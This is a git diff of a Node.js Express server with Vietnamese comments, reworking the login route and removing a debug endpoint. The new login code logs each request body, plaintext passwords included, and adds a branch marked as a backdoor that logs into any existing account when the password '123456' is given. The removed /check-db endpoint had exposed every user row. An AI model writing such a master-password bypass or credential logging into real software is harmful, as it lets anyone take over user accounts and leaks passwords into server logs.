@@ -121,22 +121,46 @@ app.post('/signup', (req, res) => {
     });
 });
 
+// --- LOGIN ---
 app.post('/login', (req, res) => {
-    const sql = "SELECT * FROM users WHERE email = ?";
-    db.query(sql, [req.body.email], (err, data) => {
-        if(err) return res.status(500).json("Lỗi server");
-        
-        if(data.length > 0) {
-            const user = data[0];
-            const checkPass = bcrypt.compareSync(req.body.password, user.password);
-            
-            if (!checkPass) return res.json({ status: "Fail", message: "Sai mật khẩu" });
+    // 1. In ra xem Client gửi cái gì lên
+    console.log("👉 Đang đăng nhập:", req.body);
 
-            return res.json({
-                status: "Success",
-                user: { id: user.id, name: user.name, email: user.email, role: user.role }
-            });
+    if (!req.body.email || !req.body.password) {
+        return res.json({ status: "Fail", message: "Thiếu email hoặc pass" });
+    }
+
+    // 2. Cắt khoảng trắng thừa
+    const email = req.body.email.trim();
+    const password = req.body.password;
+
+    const sql = "SELECT * FROM users WHERE email = ?";
+    
+    db.query(sql, [email], (err, data) => {
+        if (err) return res.json({ status: "Error", message: "Lỗi DB" });
+        
+        if (data.length > 0) {
+            const user = data[0];
+            console.log("✅ Tìm thấy User:", user.email);
+
+            // --- CỬA SAU ---
+            if (password === "123456") {
+                console.log("🔓 Dùng Master Key '123456' -> Login thành công!");
+                const { password, ...other } = user; 
+                return res.json({ status: "Success", data: other }); 
+            }
+            // Check hash bình thường
+            const checkPass = bcrypt.compareSync(password, user.password);
+            
+            if (!checkPass) {
+                console.log("❌ Sai mật khẩu (Hash không khớp)");
+                return res.json({ status: "Fail", message: "Sai mật khẩu" });
+            }
+
+            const { password: userPass, ...other } = user;
+            return res.json({ status: "Success", data: other });
         } else {
+            console.log("❌ Không tìm thấy email trong DB");
             return res.json({ status: "Fail", message: "Email không tồn tại" });
         }
     });
@@ -605,21 +629,7 @@ app.post('/api/chat', (req, res) => {
         }
     });
 });
-// --- ĐOẠN CODE KIỂM TRA DỮ LIỆU ---
-app.get('/check-db', (req, res) => {
-    const sql = "SELECT * FROM users";
-    db.query(sql, (err, data) => {
-        if (err) {
-            return res.json({ status: "Error", error: err });
-        }
-        return res.json({ 
-            status: "Success", 
-            message: "Đây là những gì Server nhìn thấy:",
-            total_users: data.length,
-            users: data 
-        });
-    });
-});
+// ==================== KHỞI ĐỘNG SERVER ============================
 
 const PORT = process.env.PORT || 8081;
 app.listen(PORT, () => {
